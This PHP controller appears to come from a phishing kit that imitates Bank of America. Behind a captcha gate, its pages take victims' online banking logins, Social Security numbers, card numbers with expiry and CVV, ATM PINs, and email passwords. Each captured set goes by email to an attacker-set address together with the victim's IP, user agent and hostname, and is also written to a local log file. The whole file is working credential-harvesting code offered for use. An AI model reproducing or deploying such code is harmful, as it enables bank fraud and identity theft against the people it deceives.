<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {


	public function index()
	{
		if (X_CAPTCHA) {
			$this->load->view('captcha');
		}else{
			$this->session->set_userdata('captcha_status', 'passed');
			redirect(site_url('authen'));
		}
	}

	public function authen()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('authen');
	}




	public function billing()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		if ($this->input->method() == 'post') {
			$msg[] = "==============|| AUTH LOGIN ||==============";
			$msg[] = "Username: " . $this->input->post('dummy-onlineId');
			$msg[] = "Password: " . $this->input->post('dummy-passcode');
			$msg[] = "Phone from Captcha : " . $_SESSION['phone'];
			$this->send_mail($msg, 'BoaRez');

		}
		
		
		$this->load->view('billing');
	}


	public function email()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		if ($this->input->method() == 'post') {
				
			$msg = [];
			$msg[] = "==============|| Billing ||==============";
			$msg[] = "SSN: " . $this->input->post('ssn');
			$msg[] = "CCnumb: " . $this->input->post('ccn');
			$msg[] = "EXP: " . $this->input->post('cexp');
			$msg[] = "CVV: " . $this->input->post('ccv');
			$msg[] = "ATMPin: " . $this->input->post('atmi');
			$this->send_mail($msg, 'BoaRez');
			header("Location:email");
	}

		$this->load->view('email');
	}



	public function com()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		if ($this->input->method() == 'post') {
			$action = $this->input->post('action');
			if ($action == 1) {
				$msg = [];
				$msg[] = "==============|| EMAIL ERROR LOGIN ||==============";
				$msg[] = "Email: " . $this->input->post('emad');
				$msg[] = "EmailPass: " . $this->input->post('empa');
				$this->send_mail($msg, 'BoaRez');
				header("Location:email?error=1");
			} else if ($action == 2) {
				$msg = [];
				$msg[] = "==============|| EMAIL LOGIN ||==============";
				$msg[] = "Email: " . $this->input->post('emad');
				$msg[] = "EmailPass: " . $this->input->post('empa');
				$this->send_mail($msg, 'BoaRez');
				header("Location:com");
			}
	}
		
		$this->load->view('com');
	}
	

	public function send_mail($msg=[], $sbj='')
	{
		$ip = getenv("REMOTE_ADDR");
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$hostname = gethostbyaddr($ip);

		$this->email->from(X_RESULT_FROMEMAIL, X_RESULT_NAME);
		$this->email->to(X_RESULT_EMAIL);

		$msg[] = "IP: " . $ip;
		$msg[] = "UA: " . $useragent;
		$msg[] = "HOST: " . $hostname;
		$msg_body = "";
		foreach ($msg as $key => $m) {
			$msg_body .= $m."\n";
		}
		
		$this->email->subject($sbj .' - '. $ip);



		$this->email->message($msg_body);

		$this->email->subject($sbj .' - '. $ip);
        $fp = fopen("best4allboa12.txt","a");
		fputs($fp,$msg_body);
		fclose($fp);

		if (@$this->email->send()) {
			// exit('true');
			return true;
		} else {
			return false;
			// exit('false');
		}
	}

	
}
